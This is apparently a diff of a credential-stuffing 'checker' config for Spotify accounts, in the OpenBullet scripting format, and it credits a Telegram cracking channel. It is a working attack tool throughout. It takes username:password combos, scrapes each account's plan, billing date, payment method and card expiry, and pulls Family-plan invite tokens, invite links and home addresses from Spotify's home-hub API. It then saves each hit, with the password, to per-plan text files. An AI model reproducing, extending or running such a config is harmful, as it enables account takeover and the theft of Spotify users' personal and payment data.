+!  KEY "vi" VALUE "U.S. VIRGIN ISLANDS" 
+!  KEY "wf" VALUE "WALLIS AND FUTUNA" 
+!  KEY "ye" VALUE "YEMEN" 
+!  KEY "zw" VALUE "ZIMBABWE" 
+!  "<Cod>" -> CAP "Country" 
+
+!#Plan PARSE "<SOURCE>" LR "\"plan\":{\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Custom "CUSTOM" OR 
+!    KEY "<Plan>" Contains "Spotify Free" 
+
+!#Getdate PARSE "<SOURCE>" LR "class=\\u0022recurring-date\\u0022\\u003E" "\\u003C\\/b\\u003E.\"}," -> VAR "date" 
+
+!#Nex_Billing_Date FUNCTION Replace "\\/" "/" "<date>" -> CAP "Next Billing Date" 
+
+!#TimeNow FUNCTION CurrentUnixTime -> VAR "TimeNow" 
+
+!#TimePlan FUNCTION DateToUnixTime "MM/dd/yy" "<Next Billing Date>" -> VAR "TimePlan" 
+
+!#Comput FUNCTION Compute "(<TimePlan>-<TimeNow>)/86400" -> VAR "Comput" 
+
+!#DaysLeft FUNCTION Round "<Comput>" -> CAP "DaysLeft" 
+
+!#Payment_Method PARSE "<SOURCE>" LR "{\"paymentMethod\":{\"name\":\"" "\"," CreateEmpty=FALSE -> CAP "Payment Method" 
+
+!#GetExpiry PARSE "<SOURCE>" LR "\"expiry\":\"" "\"" -> VAR "expiry" 
+
+!#Expiry FUNCTION Replace "\\/" "/" "<expiry>" -> CAP "Expiry" 
+
+IF "<Plan>" Contains "Spotify Premium Family"
+
+!#Get_Family REQUEST GET "https://www.spotify.com/us/home-hub/api/v1/family/home/" 
+!  
+!  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+!  HEADER "accept-encoding: gzip, deflate, br" 
+!  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+!  HEADER "cache-control: max-age=0" 
+!  HEADER "sec-fetch-dest: document" 
+!  HEADER "sec-fetch-mode: navigate" 
+!  HEADER "sec-fetch-site: none" 
+!  HEADER "sec-fetch-user: ?1" 
+!  HEADER "upgrade-insecure-requests: 1" 
+!  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+
+!#invite_Token PARSE "<SOURCE>" JSON "inviteToken" CreateEmpty=FALSE -> CAP "invite Token" 
+
+!#Max_Capacity PARSE "6" LR "" "" CreateEmpty=FALSE -> CAP "Max Cpacity" 
+
+!#occurences FUNCTION CountOccurrences "isChildAccount" "<SOURCE>" -> VAR "occurences" 
+
+!#inv FUNCTION Constant "<occurences>/6" -> CAP "Invites Left" 
+
+!#invite_link FUNCTION Constant "https://www.spotify.com/<Cod>/family/join/invite/<invite Token>/" -> CAP "invite link" 
+
+!#is_Child_Account PARSE "<SOURCE>" JSON "isChildAccount" CreateEmpty=FALSE -> CAP "is Child Account" 
+
+!#Address PARSE "<SOURCE>" JSON "address" CreateEmpty=FALSE -> CAP "Address" 
+
+!#onboarding_State PARSE "<SOURCE>" JSON "onboardingState" CreateEmpty=FALSE -> CAP "Onboarding State" 
+
+!#homeId PARSE "<SOURCE>" JSON "homeId" CreateEmpty=FALSE -> CAP "home Id" 
+
+!#Premium_Family UTILITY File "Spotify Premium Family.txt" AppendLines "============[Account]============\\r\\nCombo: <USERNAME>:<PASSWORD>\\r\\n============[Information]============\\r\\nUsername: <Username>\\r\\nDate of birth: <Date of birth>\\r\\nCountry: <Country>\\r\\nCountry Cod: <CountryCod>\\r\\nPlan: <Plan>\\r\\n============[Family]============\\r\\nHome Id: <home Id>\\r\\nOnboarding State: <Onboarding State>\\r\\nMax Cpacity: <Max Cpacity>\\r\\nInvites Left: <Invites Left>\\r\\nIs Child Account: <is Child Account>\\r\\nAddress: <Address>\\r\\nInvite Token: <invite Token>\\r\\nInvite link: <invite link>\\r\\n============[End]============\\r\\n" 
+
+ENDIF
+IF "<Plan>" Contains "Spotify Premium"
+
+!#Spotify_Premium UTILITY File "Spotify Premium.txt" AppendLines "============[Account]============\\r\\nCombo: <USERNAME>:<PASSWORD>\\r\\n============[Information]============\\r\\nUsername: <Username>\\r\\nDate of birth: <Date of birth>\\r\\nCountry: <Country>\\r\\nCountry Cod: <CountryCod>\\r\\nPlan: <Plan>\\r\\nNext Billing Date: <Next Billing Date>\\r\\nDaysLeft: <DaysLeft>\\r\\nPayment Method: <Payment Method>\\r\\nExpiry: <Expiry>\\r\\n============[End]============\\r\\n" 
+
+ENDIF
+IF "<Plan>" Contains "Premium Duo"
+
+!#Premium_Duo UTILITY File "Spotify Premium Duo.txt" AppendLines "============[Account]============\\r\\nCombo: <USERNAME>:<PASSWORD>\\r\\n============[Information]============\\r\\nUsername: <Username>\\r\\nDate of birth: <Date of birth>\\r\\nCountry: <Country>\\r\\nCountry Cod: <CountryCod>\\r\\nPlan: <Plan>\\r\\nNext Billing Date: <Next Billing Date>\\r\\nDaysLeft: <DaysLeft>\\r\\nPayment Method: <Payment Method>\\r\\nExpiry: <Expiry>\\r\\n============[End]============\\r\\n" 
+
+ENDIF
+IF "<Plan>" Contains "Spotify Premium with Hulu"
+
+!#Premium_with_Hulu UTILITY File "Spotify Premium with Hulu.txt" AppendLines "============[Account]============\\r\\nCombo: <USERNAME>:<PASSWORD>\\r\\n============[Information]============\\r\\nUsername: <Username>\\r\\nDate of birth: <Date of birth>\\r\\nCountry: <Country>\\r\\nCountry Cod: <CountryCod>\\r\\nPlan: <Plan>\\r\\nNext Billing Date: <Next Billing Date>\\r\\nDaysLeft: <DaysLeft>\\r\\nPayment Method: <Payment Method>\\r\\nExpiry: <Expiry>\\r\\n============[End]============\\r\\n" 
+
+ENDIF
+IF "<Plan>" Contains "Premium for Students"
+
+!#Premium_for_Students UTILITY File "Spotify Premium for Students.txt" AppendLines "============[Account]============\\r\\nCombo: <USERNAME>:<PASSWORD>\\r\\n============[Information]============\\r\\nUsername: <Username>\\r\\nDate of birth: <Date of birth>\\r\\nCountry: <Country>\\r\\nCountry Cod: <CountryCod>\\r\\nPlan: <Plan>\\r\\nNext Billing Date: <Next Billing Date>\\r\\nDaysLeft: <DaysLeft>\\r\\nPayment Method: <Payment Method>\\r\\nExpiry: <Expiry>\\r\\n============[End]============\\r\\n" 
+
+ENDIF
+
+!#About FUNCTION Constant "t.me/mr_amirho3ein" -> CAP "Configed by" 
+
+!#About FUNCTION Constant "t.me/Crackzx" -> CAP "My channel ID" 
+
